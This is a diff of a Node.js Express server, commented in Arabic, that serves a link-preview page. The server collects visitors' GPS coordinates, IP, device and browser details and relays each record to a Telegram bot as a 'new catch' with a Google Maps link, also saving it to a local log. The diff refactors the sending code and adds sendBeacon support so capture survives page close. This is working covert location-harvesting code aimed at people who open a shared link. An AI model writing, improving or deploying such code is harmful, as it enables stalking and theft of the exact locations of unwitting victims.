@@ -1,57 +1,98 @@
 require('dotenv').config();
 const express = require('express');
-const fetch = (...args) => import('node-fetch').then(({ default: fetch }) => fetch(...args));
+const https = require('https');
 const fs = require('fs');
 const path = require('path');
 const app = express();
 const PORT = process.env.PORT || 3000;
 
 app.use(express.json());
+app.use(express.urlencoded({ extended: true }));
 app.use(express.static('public'));
 
-// الصفحة الرئيسية مع حقن الرابط الكامل للمعاينة لضمان ظهور الصورة في تلجرام وواتساب
+// وظيفة إرسال رسالة تلجرام باستخدام https المدمجة (بدون node-fetch)
+function sendTelegram(token, chatId, text) {
+    return new Promise((resolve, reject) => {
+        const payload = JSON.stringify({
+            chat_id: chatId,
+            text: text,
+            parse_mode: 'Markdown'
+        });
+
+        const options = {
+            hostname: 'api.telegram.org',
+            port: 443,
+            path: `/bot${token}/sendMessage`,
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/json',
+                'Content-Length': Buffer.byteLength(payload)
+            },
+            timeout: 10000
+        };
+
+        const req = https.request(options, (res) => {
+            let data = '';
+            res.on('data', (chunk) => { data += chunk; });
+            res.on('end', () => {
+                console.log('[Telegram] Response:', data.substring(0, 200));
+                resolve(data);
+            });
+        });
+
+        req.on('error', (e) => {
+            console.error('[Telegram] Error:', e.message);
+            reject(e);
+        });
+
+        req.on('timeout', () => {
+            req.destroy();
+            reject(new Error('Request timeout'));
+        });
+
+        req.write(payload);
+        req.end();
+    });
+}
+
+// الصفحة الرئيسية
 app.get('/', (req, res) => {
     let html = fs.readFileSync(path.join(__dirname, 'public', 'index.html'), 'utf8');
 
-    // تحديد الرابط الكامل للسيرفر (يدعم Render والعمل المحلي)
     const protocol = req.headers['x-forwarded-proto'] || req.protocol;
     const fullUrl = protocol + '://' + req.get('host');
 
-    // استبدال SITE_URL بالرابط الحقيقي للسيرفر
     html = html.replace(/SITE_URL/g, fullUrl);
 
-    // إضافة هيدر خاص لمنع واتساب من التقاط الكاش
     res.setHeader('Cache-Control', 'no-store, no-cache, must-revalidate, private');
 
-    // فحص المتغيرات لأغراض التصحيح (تظهر في Logs ريندر فقط)
     const hasToken = !!process.env.TELEGRAM_BOT_TOKEN;
     const hasChatId = !!process.env.TELEGRAM_CHAT_ID;
-    console.log(`[Status] Request from ${req.headers['user-agent']} | Env: Token=${hasToken}, ChatID=${hasChatId}`);
+    console.log(`[Visit] ${req.headers['user-agent']?.substring(0, 50)} | Token=${hasToken}, ChatID=${hasChatId}`);
 
     res.send(html);
 });
 
+// استقبال بيانات الموقع (يدعم JSON و text/plain من sendBeacon)
 app.post('/api/location', async (req, res) => {
-    const data = req.body;
+    // إرسال الرد فوراً حتى لا يتعلق المتصفح
+    res.json({ success: true });
+
+    let data;
+    if (typeof req.body === 'string') {
+        try { data = JSON.parse(req.body); } catch (e) { data = req.body; }
+    } else {
+        data = req.body;
+    }
+
     const token = process.env.TELEGRAM_BOT_TOKEN;
     const chatId = process.env.TELEGRAM_CHAT_ID;
     const clientIp = data.ip || req.headers['x-forwarded-for'] || req.socket.remoteAddress;
 
-    // جلب معلومات إضافية من الـ IP إذا لم تكن موجودة
-    let geoInfo = {
-        country: data.country || 'غير معروف',
-        city: data.city || 'غير معروف',
-        isp: data.isp || 'غير معروف'
-    };
-
-    const flag = (data.countryCode || '🌐');
-
-    // تحديد نوع الجهاز من الـ User-Agent بشكل أدق للتلجرام
     const ua = data.userAgent || '';
-    const deviceType = /iPhone|iPad|iPod/i.test(ua) ? ' iPhone' : (/Android/i.test(ua) ? '🤖 Android' : '💻 PC');
+    const deviceType = /iPhone|iPad|iPod/i.test(ua) ? '📱 iPhone' : (/Android/i.test(ua) ? '🤖 Android' : '💻 PC');
 
-    const message = `
-🎯 *صيد جديد (${deviceType})*
+    const message = `🎯 *صيد جديد (${deviceType})*
 ━━━━━━━━━━━━━━━━━━
 📱 *الجهاز:* \`${data.platform || 'N/A'}\`
 ├ *المتصفح:* \`${ua.split(' ').pop()}\`
@@ -62,7 +103,7 @@ app.post('/api/location', async (req, res) => {
 
 🌐 *الشبكة:*
 ├ *IP:* \`${data.ip || clientIp}\`
-└ *الموقع:* ${geoInfo.country} - ${geoInfo.city}
+└ *الموقع:* ${data.country || 'غير معروف'} - ${data.city || 'غير معروف'}
 
 📍 *GPS:*
 ├ *العرض:* \`${data.latitude}\`
@@ -71,52 +112,70 @@ app.post('/api/location', async (req, res) => {
 
 🗺️ *خرائط جوجل:*
 https://www.google.com/maps?q=${data.latitude},${data.longitude}
-━━━━━━━━━━━━━━━━━━
-`;
+━━━━━━━━━━━━━━━━━━`;
 
-    console.log(`[${new Date().toISOString()}] New hit from ${deviceType} (${clientIp})`);
+    console.log(`[HIT] ${deviceType} from ${clientIp}`);
 
-    // حفظ البيانات محلياً كنسخة احتياطية
-    const logEntry = { ...data, deviceType, clientIp, timestamp: new Date().toISOString() };
-    const logsPath = path.join(__dirname, 'logs.json');
-    let logs = [];
-    if (fs.existsSync(logsPath)) {
-        try { logs = JSON.parse(fs.readFileSync(logsPath)); } catch (e) { logs = []; }
-    }
-    logs.push(logEntry);
-    fs.writeFileSync(logsPath, JSON.stringify(logs, null, 2));
-
-    if (!token || !chatId) {
-        return res.json({ success: true, warning: 'Telegram config missing' });
-    }
-
+    // حفظ نسخة احتياطية
     try {
-        await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({ chat_id: chatId, text: message, parse_mode: 'Markdown' })
-        });
-        res.json({ success: true });
-    } catch (error) {
-        console.error('Telegram Error:', error);
-        res.status(500).json({ error: 'Failed' });
+        const logsPath = path.join(__dirname, 'logs.json');
+        let logs = [];
+        if (fs.existsSync(logsPath)) {
+            try { logs = JSON.parse(fs.readFileSync(logsPath)); } catch (e) { logs = []; }
+        }
+        logs.push({ ...data, deviceType, clientIp, timestamp: new Date().toISOString() });
+        fs.writeFileSync(logsPath, JSON.stringify(logs, null, 2));
+    } catch (e) {
+        console.error('[Logs] Save error:', e.message);
+    }
+
+    // إرسال لتلجرام
+    if (token && chatId) {
+        try {
+            await sendTelegram(token, chatId, message);
+            console.log('[Telegram] Sent successfully!');
+        } catch (error) {
+            console.error('[Telegram] Failed:', error.message);
+        }
+    } else {
+        console.warn('[Telegram] Missing TOKEN or CHAT_ID!');
     }
 });
 
-// مسار للاختبار السريع من المتصفح
+// دعم sendBeacon (يرسل كـ text/plain)
+app.post('/api/location', express.text({ type: 'text/plain' }), (req, res) => {
+    // يتم معالجته بواسطة الـ handler أعلاه
+});
+
+// مسار اختبار
 app.get('/api/test', async (req, res) => {
     const token = process.env.TELEGRAM_BOT_TOKEN;
     const chatId = process.env.TELEGRAM_CHAT_ID;
+
+    if (!token || !chatId) {
+        return res.send('❌ TOKEN أو CHAT_ID غير موجودين في Environment Variables!');
+    }
+
     try {
-        await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({ chat_id: chatId, text: '🔔 اختبار: السيرفر متصل بتلجرام بنجاح!' })
-        });
-        res.send('✅ تم إرسال رسالة اختبار إلى تلجرام. تحقق من البوت!');
+        await sendTelegram(token, chatId, '🔔 اختبار: السيرفر متصل بتلجرام بنجاح!');
+        res.send('✅ تم إرسال رسالة اختبار إلى تلجرام!');
     } catch (e) {
-        res.status(500).send('❌ فشل إرسال الرسالة: ' + e.message);
+        res.status(500).send('❌ فشل: ' + e.message);
     }
 });
 
-app.listen(PORT, () => { console.log(`Server running on port ${PORT}`); });
+// مسار تشخيصي
+app.get('/api/status', (req, res) => {
+    res.json({
+        server: 'running',
+        token: !!process.env.TELEGRAM_BOT_TOKEN,
+        chatId: !!process.env.TELEGRAM_CHAT_ID,
+        time: new Date().toISOString()
+    });
+});
+
+app.listen(PORT, () => {
+    console.log(`✅ Server running on port ${PORT}`);
+    console.log(`   Token: ${process.env.TELEGRAM_BOT_TOKEN ? 'SET ✓' : 'MISSING ✗'}`);
+    console.log(`   ChatID: ${process.env.TELEGRAM_CHAT_ID ? 'SET ✓' : 'MISSING ✗'}`);
+});
